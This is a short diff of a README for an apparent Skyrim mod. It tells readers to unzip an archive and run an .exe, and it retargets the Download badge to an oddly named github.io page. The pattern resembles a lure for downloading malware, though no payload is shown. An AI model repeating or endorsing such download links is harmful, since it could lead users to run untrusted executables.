@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://skyrim-the-phoenix-flavour.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://dunklebergerjunbundette.github.io/.github/the-phoenix-flavour)
 
 ## 📸 Overview
 ![skyrim-phoenix-visuals](https://github.com/user-attachments/assets/e1504321-e48e-430c-ad14-d3dd80f4bf8c)
